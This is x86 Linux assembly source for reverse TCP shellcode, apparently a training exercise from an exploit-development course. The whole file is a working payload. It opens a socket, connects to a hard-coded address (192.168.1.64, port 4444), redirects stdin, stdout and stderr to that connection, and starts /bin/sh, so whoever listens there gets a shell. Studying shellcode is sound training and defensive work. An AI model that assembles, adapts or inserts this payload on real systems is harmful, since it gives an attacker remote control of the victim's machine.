; Description:  Reverse TCP shellcode
; Author: Manuel Mancera (SLAE - 858)

global _start			

section .text
_start:
	; int socket(int domain, int type, int protocol);
	xor eax, eax
	xor ebx, ebx
	push eax		; protocol	- 0
	push 1			; type		- SOCK_STREAM,
	push 2			; dominio 	- AF_INET

	mov ecx, esp		; arguments
	mov bl, 1		; sys_socket
	mov al, 102		; systemcall
	int 0x80

	mov esi, eax		; save sockfd


	; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor ecx, ecx
	push 0x4001a8c0		; addr (192.168.1.64)
	push word 0x5c11	; Port 4444
	push word 2		; PF_INET
	mov ecx, esp		; save *addr in ecx
	
	push 0x10		; length addrlen=16
	push ecx		; &serv_addr
	push esi		; sockfd

	mov ecx, esp		; arguments
	mov al, 102		; systemcall
	mov bl, 3		; sys_connect
	int 0x80


	; int dup2(int oldfd, int newfd);	
	mov ebx, esi		; oldfd = clientfd
	xor ecx, ecx            ; ecx = newfd      
loop:
    	mov al, 0x3f           	; syscall dup2    
    	int 0x80
	inc ecx			
    	cmp ecx, 0x2
    	jle loop


	; execve stack-sh
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80	
